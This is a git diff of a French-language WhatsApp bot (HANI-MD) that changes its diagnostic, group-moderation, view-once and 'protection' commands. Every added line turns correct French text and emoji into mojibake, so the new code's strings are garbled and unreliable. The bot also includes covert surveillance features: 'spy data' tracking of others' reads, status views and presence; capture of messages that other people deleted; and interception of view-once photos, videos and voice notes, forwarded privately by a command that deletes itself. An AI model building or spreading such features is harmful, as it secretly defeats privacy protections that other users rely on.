+ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
+ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
+ðŸš« Bannis: ${db.data.banned.length}
+ðŸ‘‘ Sudos: ${db.data.sudo.length}`);
     }
 
     case "diagnostic":
     case "diag":
     case "health":
     case "sante": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const uptime = formatUptime(Date.now() - db.data.stats.startTime);
       const memUsage = process.memoryUsage();
       const memMB = Math.round(memUsage.heapUsed / 1024 / 1024);
       const memTotalMB = Math.round(memUsage.heapTotal / 1024 / 1024);
       
-      // État des protections
+      // Ã‰tat des protections
       const protections = Object.entries(protectionState)
-        .map(([k, v]) => `${v ? '✅' : '❌'} ${k}`)
+        .map(([k, v]) => `${v ? 'âœ…' : 'âŒ'} ${k}`)
         .join('\n');
       
-      // État des données espion
+      // Ã‰tat des donnÃ©es espion
       const spyStats = {
         statusViews: spyData.statusViews?.length || 0,
         messageReads: spyData.messageReads?.length || 0,
@@ -4484,45 +4484,45 @@ NUMERO_OWNER=...,...,${senderNumber}` : "✅ Tu es bien reconnu comme OWNER!"}
         contacts: contactsDB.size || 0
       };
       
-      // État MySQL
-      const mysqlStatus = db.mysqlConnected ? '✅ Connecté' : '❌ Non connecté (mode local)';
+      // Ã‰tat MySQL
+      const mysqlStatus = db.mysqlConnected ? 'âœ… ConnectÃ©' : 'âŒ Non connectÃ© (mode local)';
       
-      const diagText = `🔧 ═══════════════════════════
-   *DIAGNOSTIC SYSTÈME HANI-MD*
-═══════════════════════════
+      const diagText = `ðŸ”§ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   *DIAGNOSTIC SYSTÃˆME HANI-MD*
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-📊 *SYSTÈME:*
-• ⏱️ Uptime: ${uptime}
-• 💾 RAM: ${memMB}MB / ${memTotalMB}MB
-• 📦 Node.js: ${process.version}
-• 🖥️ Plateforme: ${process.platform}
+ðŸ“Š *SYSTÃˆME:*
+â€¢ â±ï¸ Uptime: ${uptime}
+â€¢ ðŸ’¾ RAM: ${memMB}MB / ${memTotalMB}MB
+â€¢ ðŸ“¦ Node.js: ${process.version}
+â€¢ ðŸ–¥ï¸ Plateforme: ${process.platform}
 
-🗄️ *BASE DE DONNÉES:*
-• MySQL: ${mysqlStatus}
-• 👥 Utilisateurs: ${Object.keys(db.data.users).length}
-• 🏘️ Groupes: ${Object.keys(db.data.groups).length}
-• 📇 Contacts enregistrés: ${spyStats.contacts}
+ðŸ—„ï¸ *BASE DE DONNÃ‰ES:*
+â€¢ MySQL: ${mysqlStatus}
+â€¢ ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
+â€¢ ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
+â€¢ ðŸ“‡ Contacts enregistrÃ©s: ${spyStats.contacts}
 
-🕵️ *DONNÉES ESPION:*
-• 👁️ Vues statuts: ${spyStats.statusViews}
-• 📖 Messages lus: ${spyStats.messageReads}
-• ↩️ Réponses: ${spyStats.replies}
-• ✍️ Présences: ${spyStats.presences}
+ðŸ•µï¸ *DONNÃ‰ES ESPION:*
+â€¢ ðŸ‘ï¸ Vues statuts: ${spyStats.statusViews}
+â€¢ ðŸ“– Messages lus: ${spyStats.messageReads}
+â€¢ â†©ï¸ RÃ©ponses: ${spyStats.replies}
+â€¢ âœï¸ PrÃ©sences: ${spyStats.presences}
 
-💾 *STOCKAGE MESSAGES:*
-• 📨 Messages stockés: ${messageStore.size}
-• 🗑️ Messages supprimés: ${deletedMessages.length}
-• 👁️ ViewOnce interceptés: ${viewOnceMessages.size}
-• 📸 Statuts sauvegardés: ${statusStore.size}
+ðŸ’¾ *STOCKAGE MESSAGES:*
+â€¢ ðŸ“¨ Messages stockÃ©s: ${messageStore.size}
+â€¢ ðŸ—‘ï¸ Messages supprimÃ©s: ${deletedMessages.length}
+â€¢ ðŸ‘ï¸ ViewOnce interceptÃ©s: ${viewOnceMessages.size}
+â€¢ ðŸ“¸ Statuts sauvegardÃ©s: ${statusStore.size}
 
-🛡️ *PROTECTIONS:*
+ðŸ›¡ï¸ *PROTECTIONS:*
 ${protections}
 
-═══════════════════════════
-💡 *Commandes utiles:*
-• _.spyclear_ - Vider données espion
-• _.protection_ - Gérer protections
-• _.restart_ - Redémarrer le bot`;
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ’¡ *Commandes utiles:*
+â€¢ _.spyclear_ - Vider donnÃ©es espion
+â€¢ _.protection_ - GÃ©rer protections
+â€¢ _.restart_ - RedÃ©marrer le bot`;
       
       return send(diagText);
     }
@@ -4530,111 +4530,111 @@ ${protections}
     case "runtime":
     case "uptime": {
       const uptime = formatUptime(Date.now() - db.data.stats.startTime);
-      return send(`⏱️ *Temps en ligne*\n\n🤖 HANI-MD fonctionne depuis: *${uptime}*`);
+      return send(`â±ï¸ *Temps en ligne*\n\nðŸ¤– HANI-MD fonctionne depuis: *${uptime}*`);
     }
 
-    // ────────── GROUPE ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GROUPE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "kick":
     case "remove": {
-      if (!isGroupMsg) return send("❌ Cette commande est réservée aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin pour utiliser cette commande.");
-      if (!isBotAdmin) return send("❌ Je dois être admin pour exclure quelqu'un.");
+      if (!isGroupMsg) return send("âŒ Cette commande est rÃ©servÃ©e aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin pour utiliser cette commande.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin pour exclure quelqu'un.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un ou réponds à son message.");
+      if (!target) return send("âŒ Mentionne quelqu'un ou rÃ©ponds Ã  son message.");
       
       try {
         await hani.groupParticipantsUpdate(from, [target], "remove");
-        return reply(`✅ ${target.split("@")[0]} a été exclu du groupe.`);
+        return reply(`âœ… ${target.split("@")[0]} a Ã©tÃ© exclu du groupe.`);
       } catch (e) {
-        return send("❌ Impossible d'exclure ce membre.");
+        return send("âŒ Impossible d'exclure ce membre.");
       }
     }
 
     case "add": {
-      if (!isGroupMsg) return send("❌ Cette commande est réservée aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
-      if (!isBotAdmin) return send("❌ Je dois être admin.");
+      if (!isGroupMsg) return send("âŒ Cette commande est rÃ©servÃ©e aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
       
-      if (!args) return send("❌ Donne un numéro. Ex: .add 22550000000");
+      if (!args) return send("âŒ Donne un numÃ©ro. Ex: .add 22550000000");
       
       const number = formatNumber(args);
       try {
         await hani.groupParticipantsUpdate(from, [number], "add");
-        return reply(`✅ ${args} a été ajouté au groupe.`);
+        return reply(`âœ… ${args} a Ã©tÃ© ajoutÃ© au groupe.`);
       } catch (e) {
-        return send("❌ Impossible d'ajouter ce numéro. Vérifie le numéro ou les paramètres de confidentialité.");
+        return send("âŒ Impossible d'ajouter ce numÃ©ro. VÃ©rifie le numÃ©ro ou les paramÃ¨tres de confidentialitÃ©.");
       }
     }
 
     case "promote": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
-      if (!isBotAdmin) return send("❌ Je dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       try {
         await hani.groupParticipantsUpdate(from, [target], "promote");
-        return reply(`✅ ${target.split("@")[0]} est maintenant admin!`);
+        return reply(`âœ… ${target.split("@")[0]} est maintenant admin!`);
       } catch (e) {
-        return send("❌ Erreur lors de la promotion.");
+        return send("âŒ Erreur lors de la promotion.");
       }
     }
 
     case "demote": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
-      if (!isBotAdmin) return send("❌ Je dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       try {
         await hani.groupParticipantsUpdate(from, [target], "demote");
-        return reply(`✅ ${target.split("@")[0]} n'est plus admin.`);
+        return reply(`âœ… ${target.split("@")[0]} n'est plus admin.`);
       } catch (e) {
-        return send("❌ Erreur lors de la rétrogradation.");
+        return send("âŒ Erreur lors de la rÃ©trogradation.");
       }
     }
 
     case "link":
     case "grouplink": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isBotAdmin) return send("❌ Je dois être admin pour obtenir le lien.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin pour obtenir le lien.");
       
       try {
         const code = await hani.groupInviteCode(from);
-        return send(`🔗 *Lien du groupe*\n\nhttps://chat.whatsapp.com/${code}`);
+        return send(`ðŸ”— *Lien du groupe*\n\nhttps://chat.whatsapp.com/${code}`);
       } catch (e) {
-        return send("❌ Impossible d'obtenir le lien.");
+        return send("âŒ Impossible d'obtenir le lien.");
       }
     }
 
     case "desc":
     case "description":
     case "setdesc": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
-      if (!isBotAdmin) return send("❌ Je dois être admin.");
-      if (!args) return send("❌ Donne une description. Ex: .desc Bienvenue!");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
+      if (!args) return send("âŒ Donne une description. Ex: .desc Bienvenue!");
       
       try {
         await hani.groupUpdateDescription(from, args);
-        return reply("✅ Description mise à jour!");
+        return reply("âœ… Description mise Ã  jour!");
       } catch (e) {
-        return send("❌ Erreur lors de la mise à jour.");
+        return send("âŒ Erreur lors de la mise Ã  jour.");
       }
     }
 
     case "tagall":
     case "all": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const participants = groupMetadata.participants.map(p => p.id);
-      let text = args ? `📢 *${args}*\n\n` : "📢 *Annonce*\n\n";
+      let text = args ? `ðŸ“¢ *${args}*\n\n` : "ðŸ“¢ *Annonce*\n\n";
       participants.forEach(p => {
         text += `@${p.split("@")[0]}\n`;
       });
@@ -4643,19 +4643,19 @@ ${protections}
     }
 
     case "hidetag": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const participants = groupMetadata.participants.map(p => p.id);
-      const text = args || "📢 Message important";
+      const text = args || "ðŸ“¢ Message important";
       
       return hani.sendMessage(from, { text, mentions: participants });
     }
 
-    // ────────── PROTECTIONS GROUPE ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ PROTECTIONS GROUPE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "antilink": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const param = args.toLowerCase();
       if (param === "on") groupData.antilink = true;
@@ -4663,12 +4663,12 @@ ${protections}
       else groupData.antilink = !groupData.antilink;
       db.save();
       
-      return reply(`🔗 Antilink ${groupData.antilink ? "✅ activé" : "❌ désactivé"}`);
+      return reply(`ðŸ”— Antilink ${groupData.antilink ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "antispam": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const param = args.toLowerCase();
       if (param === "on") groupData.antispam = true;
@@ -4676,12 +4676,12 @@ ${protections}
       else groupData.antispam = !groupData.antispam;
       db.save();
       
-      return reply(`🚫 Antispam ${groupData.antispam ? "✅ activé" : "❌ désactivé"}`);
+      return reply(`ðŸš« Antispam ${groupData.antispam ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "antibot": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const param = args.toLowerCase();
       if (param === "on") groupData.antibot = true;
@@ -4689,12 +4689,12 @@ ${protections}
       else groupData.antibot = !groupData.antibot;
       db.save();
       
-      return reply(`🤖 Antibot ${groupData.antibot ? "✅ activé" : "❌ désactivé"}`);
+      return reply(`ðŸ¤– Antibot ${groupData.antibot ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "antitag": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       const param = args.toLowerCase();
       if (param === "on") groupData.antitag = true;
@@ -4702,32 +4702,32 @@ ${protections}
       else groupData.antitag = !groupData.antitag;
       db.save();
       
-      return reply(`🏷️ Antitag ${groupData.antitag ? "✅ activé" : "❌ désactivé"}`);
+      return reply(`ðŸ·ï¸ Antitag ${groupData.antitag ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "mute":
     case "mutegroup": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
-      if (!isBotAdmin) return send("❌ Je dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
+      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
       
       const param = args.toLowerCase();
       const mute = param === "on" || param === "";
       
       try {
         await hani.groupSettingUpdate(from, mute ? "announcement" : "not_announcement");
-        return reply(mute ? "🔇 Groupe muté. Seuls les admins peuvent parler." : "🔊 Groupe démuté.");
+        return reply(mute ? "ðŸ”‡ Groupe mutÃ©. Seuls les admins peuvent parler." : "ðŸ”Š Groupe dÃ©mutÃ©.");
       } catch (e) {
-        return send("❌ Erreur lors du mute.");
+        return send("âŒ Erreur lors du mute.");
       }
     }
 
     case "warn": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       const warns = db.addWarn(from, target);
       
@@ -4735,41 +4735,41 @@ ${protections}
         if (isBotAdmin) {
           await hani.groupParticipantsUpdate(from, [target], "remove");
           db.resetWarns(from, target);
-          return reply(`⚠️ @${target.split("@")[0]} a atteint 3 warns et a été exclu!`, { mentions: [target] });
+          return reply(`âš ï¸ @${target.split("@")[0]} a atteint 3 warns et a Ã©tÃ© exclu!`, { mentions: [target] });
         }
-        return reply(`⚠️ @${target.split("@")[0]} a 3 warns mais je ne suis pas admin pour l'exclure.`, { mentions: [target] });
+        return reply(`âš ï¸ @${target.split("@")[0]} a 3 warns mais je ne suis pas admin pour l'exclure.`, { mentions: [target] });
       }
       
       return hani.sendMessage(from, { 
-        text: `⚠️ @${target.split("@")[0]} a reçu un avertissement!\n📊 Warns: ${warns}/3`,
+        text: `âš ï¸ @${target.split("@")[0]} a reÃ§u un avertissement!\nðŸ“Š Warns: ${warns}/3`,
         mentions: [target]
       });
     }
 
     case "unwarn":
     case "resetwarn": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
-      if (!isAdmin && !isSudo) return send("❌ Tu dois être admin.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
+      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       db.resetWarns(from, target);
-      return reply(`✅ Warns réinitialisés pour @${target.split("@")[0]}`, { mentions: [target] });
+      return reply(`âœ… Warns rÃ©initialisÃ©s pour @${target.split("@")[0]}`, { mentions: [target] });
     }
 
     case "warnlist":
     case "warns": {
-      if (!isGroupMsg) return send("❌ Réservé aux groupes.");
+      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
       
       const group = db.getGroup(from);
       const warnedUsers = Object.entries(group.warns).filter(([_, w]) => w > 0);
       
-      if (warnedUsers.length === 0) return reply("✅ Aucun membre n'a de warns.");
+      if (warnedUsers.length === 0) return reply("âœ… Aucun membre n'a de warns.");
       
-      let text = "⚠️ *Liste des warns*\n\n";
+      let text = "âš ï¸ *Liste des warns*\n\n";
       warnedUsers.forEach(([jid, count]) => {
-        text += `• @${jid.split("@")[0]}: ${count}/3 warns\n`;
+        text += `â€¢ @${jid.split("@")[0]}: ${count}/3 warns\n`;
       });
       
       return hani.sendMessage(from, { 
@@ -4778,33 +4778,33 @@ ${protections}
       });
     }
 
-    // ────────── VUE UNIQUE ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ VUE UNIQUE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "vv":
     case "viewonce":
     case "vo": {
-      // Supprimer la commande envoyée pour qu'elle soit invisible
+      // Supprimer la commande envoyÃ©e pour qu'elle soit invisible
       try {
         await hani.sendMessage(from, { delete: msg.key });
       } catch (e) {}
       
-      // Récupérer le contexte du message cité
+      // RÃ©cupÃ©rer le contexte du message citÃ©
       const contextInfo = msg.message?.extendedTextMessage?.contextInfo || 
                           msg.message?.imageMessage?.contextInfo ||
                           msg.message?.videoMessage?.contextInfo;
       
       if (!contextInfo?.quotedMessage) {
-        return sendPrivate("❌ Réponds à un message à vue unique pour le récupérer.");
+        return sendPrivate("âŒ RÃ©ponds Ã  un message Ã  vue unique pour le rÃ©cupÃ©rer.");
       }
       
       const quotedMessage = contextInfo.quotedMessage;
       const stanzaId = contextInfo.stanzaId;
       
-      // Chercher le contenu à vue unique dans différents endroits possibles
+      // Chercher le contenu Ã  vue unique dans diffÃ©rents endroits possibles
       let viewOnceContent = quotedMessage.viewOnceMessage || 
                             quotedMessage.viewOnceMessageV2 || 
                             quotedMessage.viewOnceMessageV2Extension;
       
-      // Si pas trouvé directement, chercher dans le message stocké
+      // Si pas trouvÃ© directement, chercher dans le message stockÃ©
       if (!viewOnceContent && stanzaId) {
         const stored = viewOnceMessages.get(stanzaId);
         if (stored && stored.message) {
@@ -4815,9 +4815,9 @@ ${protections}
         }
       }
       
-      // Vérifier aussi si le message cité lui-même est un média (parfois le viewOnce est déjà déroulé)
+      // VÃ©rifier aussi si le message citÃ© lui-mÃªme est un mÃ©dia (parfois le viewOnce est dÃ©jÃ  dÃ©roulÃ©)
       if (!viewOnceContent) {
-        // Peut-être que le message cité EST le contenu viewOnce (image/video avec viewOnce: true)
+        // Peut-Ãªtre que le message citÃ© EST le contenu viewOnce (image/video avec viewOnce: true)
         const mediaType = Object.keys(quotedMessage)[0];
         if (["imageMessage", "videoMessage", "audioMessage"].includes(mediaType)) {
           const mediaContent = quotedMessage[mediaType];
@@ -4830,7 +4830,7 @@ ${protections}
       if (!viewOnceContent) {
         // Afficher les infos de debug
         const keys = Object.keys(quotedMessage);
-        return sendPrivate(`❌ Ce n'est pas un message à vue unique.\n\n📋 Type détecté: ${keys.join(", ")}`);
+        return sendPrivate(`âŒ Ce n'est pas un message Ã  vue unique.\n\nðŸ“‹ Type dÃ©tectÃ©: ${keys.join(", ")}`);
       }
       
       try {
@@ -4839,10 +4839,10 @@ ${protections}
         const media = mediaMsg[mediaType];
         
         if (!media) {
-          return sendPrivate("❌ Impossible de lire le contenu du média.");
+          return sendPrivate("âŒ Impossible de lire le contenu du mÃ©dia.");
         }
         
-        // Télécharger le média
+        // TÃ©lÃ©charger le mÃ©dia
         const stream = await downloadMediaMessage(
           { message: mediaMsg, key: { remoteJid: from, id: stanzaId } },
           "buffer",
@@ -4850,16 +4850,16 @@ ${protections}
           { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
         );
         
-        // Envoyer en privé (à soi-même)
+        // Envoyer en privÃ© (Ã  soi-mÃªme)
         if (mediaType === "imageMessage" || mediaType.includes("image")) {
           await hani.sendMessage(botNumber, { 
             image: stream, 
-            caption: "👁️ *Vue unique récupérée!*\n\n" + (media.caption || "") 
+            caption: "ðŸ‘ï¸ *Vue unique rÃ©cupÃ©rÃ©e!*\n\n" + (media.caption || "") 
           });
         } else if (mediaType === "videoMessage" || mediaType.includes("video")) {
           await hani.sendMessage(botNumber, { 
             video: stream, 
-            caption: "👁️ *Vue unique récupérée!*\n\n" + (media.caption || "") 
+            caption: "ðŸ‘ï¸ *Vue unique rÃ©cupÃ©rÃ©e!*\n\n" + (media.caption || "") 
           });
         } else if (mediaType === "audioMessage" || mediaType.includes("audio")) {
           await hani.sendMessage(botNumber, { 
@@ -4867,22 +4867,22 @@ ${protections}
             mimetype: "audio/mp4"
           });
         } else {
-          return sendPrivate("❌ Type de média non supporté: " + mediaType);
+          return sendPrivate("âŒ Type de mÃ©dia non supportÃ©: " + mediaType);
         }
         
-        console.log(`[VIEW] Vue unique récupérée par ${pushName}`);
+        console.log(`[VIEW] Vue unique rÃ©cupÃ©rÃ©e par ${pushName}`);
       } catch (e) {
         console.log("Erreur VV:", e);
-        return sendPrivate("❌ Erreur: " + e.message);
+        return sendPrivate("âŒ Erreur: " + e.message);
       }
       return;
     }
 
     case "listvv":
     case "listviewonce": {
-      if (viewOnceMessages.size === 0) return send("📭 Aucun message à vue unique intercepté.");
+      if (viewOnceMessages.size === 0) return send("ðŸ“­ Aucun message Ã  vue unique interceptÃ©.");
       
-      let list = "👁️ *Messages à vue unique interceptés*\n\n";
+      let list = "ðŸ‘ï¸ *Messages Ã  vue unique interceptÃ©s*\n\n";
       let i = 1;
       for (const [id, data] of viewOnceMessages) {
         list += `${i}. De: ${data.sender}\n   Type: ${data.type}\n   Date: ${data.date}\n\n`;
@@ -4891,49 +4891,49 @@ ${protections}
       return send(list);
     }
 
-    // ────────── GESTION DES PROTECTIONS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES PROTECTIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "protections":
     case "protect":
     case "auto": {
       let status = `
-🛡️ *PROTECTIONS AUTOMATIQUES*
-━━━━━━━━━━━━━━━━━━━━━
+ðŸ›¡ï¸ *PROTECTIONS AUTOMATIQUES*
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 
-📨 Tout est envoyé dans "Moi-même"
+ðŸ“¨ Tout est envoyÃ© dans "Moi-mÃªme"
 
-✅ = Activé | ❌ = Désactivé
+âœ… = ActivÃ© | âŒ = DÃ©sactivÃ©
 
-🗑️ *Anti-delete*: ${protectionState.antidelete ? "✅" : "❌"}
-    └ Messages supprimés interceptés
+ðŸ—‘ï¸ *Anti-delete*: ${protectionState.antidelete ? "âœ…" : "âŒ"}
+    â”” Messages supprimÃ©s interceptÃ©s
 
-👁️ *Vue unique*: ${protectionState.autoViewOnce ? "✅" : "❌"}
-    └ Photos/vidéos vue unique
+ðŸ‘ï¸ *Vue unique*: ${protectionState.autoViewOnce ? "âœ…" : "âŒ"}
+    â”” Photos/vidÃ©os vue unique
 
-🎤 *Écoute unique*: ${protectionState.autoViewOnceAudio ? "✅" : "❌"}
-    └ Vocaux écoute unique
+ðŸŽ¤ *Ã‰coute unique*: ${protectionState.autoViewOnceAudio ? "âœ…" : "âŒ"}
+    â”” Vocaux Ã©coute unique
 
-📸 *Save statuts*: ${protectionState.autoSaveStatus ? "✅" : "❌"}
-    └ Tous les statuts sauvegardés
+ðŸ“¸ *Save statuts*: ${protectionState.autoSaveStatus ? "âœ…" : "âŒ"}
+    â”” Tous les statuts sauvegardÃ©s
 
-📸 *Anti-delete statut*: ${protectionState.antideletestatus ? "✅" : "❌"}
-    └ Statuts supprimés interceptés
+ðŸ“¸ *Anti-delete statut*: ${protectionState.antideletestatus ? "âœ…" : "âŒ"}
+    â”” Statuts supprimÃ©s interceptÃ©s
 
-📵 *Anti-appel*: ${protectionState.anticall ? "✅" : "❌"}
-    └ Appels automatiquement rejetés
+ðŸ“µ *Anti-appel*: ${protectionState.anticall ? "âœ…" : "âŒ"}
+    â”” Appels automatiquement rejetÃ©s
 
-🤖 *Anti-bot*: ${protectionState.antibot ? "✅" : "❌"}
-    └ Autres bots WhatsApp bloqués
-    └ Bots bloqués: ${blockedBots.size}
+ðŸ¤– *Anti-bot*: ${protectionState.antibot ? "âœ…" : "âŒ"}
+    â”” Autres bots WhatsApp bloquÃ©s
+    â”” Bots bloquÃ©s: ${blockedBots.size}
 
-━━━━━━━━━━━━━━━━━━━━━
-💡 *Pour modifier:*
-• ${config.PREFIXE}antidelete [on/off]
-• ${config.PREFIXE}viewonce [on/off]
-• ${config.PREFIXE}audioonce [on/off]
-• ${config.PREFIXE}savestatus [on/off]
-• ${config.PREFIXE}anticall [on/off]
-• ${config.PREFIXE}antibot [on/off]
-• ${config.PREFIXE}blockedbots - Liste des bots bloqués
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
+ðŸ’¡ *Pour modifier:*
+â€¢ ${config.PREFIXE}antidelete [on/off]
+â€¢ ${config.PREFIXE}viewonce [on/off]
+â€¢ ${config.PREFIXE}audioonce [on/off]
+â€¢ ${config.PREFIXE}savestatus [on/off]
+â€¢ ${config.PREFIXE}anticall [on/off]
+â€¢ ${config.PREFIXE}antibot [on/off]
+â€¢ ${config.PREFIXE}blockedbots - Liste des bots bloquÃ©s
 `;
       return send(status);
     }
@@ -4945,7 +4945,7 @@ ${protections}
       else if (param === "off") protectionState.autoViewOnce = false;
       else protectionState.autoViewOnce = !protectionState.autoViewOnce;
       
-      return send(`👁️ Interception photos/vidéos vue unique ${protectionState.autoViewOnce ? "✅ activée" : "❌ désactivée"}`);
+      return send(`ðŸ‘ï¸ Interception photos/vidÃ©os vue unique ${protectionState.autoViewOnce ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
     }
 
     case "audioonce":
@@ -4955,7 +4955,7 @@ ${protections}
       else if (param === "off") protectionState.autoViewOnceAudio = false;
       else protectionState.autoViewOnceAudio = !protectionState.autoViewOnceAudio;
       
-      return send(`🎤 Interception vocaux écoute unique ${protectionState.autoViewOnceAudio ? "✅ activée" : "❌ désactivée"}`);
+      return send(`ðŸŽ¤ Interception vocaux Ã©coute unique ${protectionState.autoViewOnceAudio ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
     }
 
     case "anticall": {
@@ -4964,24 +4964,24 @@ ${protections}
       else if (param === "off") protectionState.anticall = false;
       else protectionState.anticall = !protectionState.anticall;
       
-      return send(`📵 Anti-appel ${protectionState.anticall ? "✅ activé (appels rejetés)" : "❌ désactivé"}`);
+      return send(`ðŸ“µ Anti-appel ${protectionState.anticall ? "âœ… activÃ© (appels rejetÃ©s)" : "âŒ dÃ©sactivÃ©"}`);
     }
 
-    // ────────── ANTI-DELETE ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-DELETE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "antidelete": {
       const param = args.toLowerCase();
       if (param === "on") protectionState.antidelete = true;
       else if (param === "off") protectionState.antidelete = false;
       else protectionState.antidelete = !protectionState.antidelete;
       
-      return send(`🗑️ Antidelete ${protectionState.antidelete ? "✅ activé" : "❌ désactivé"}`);
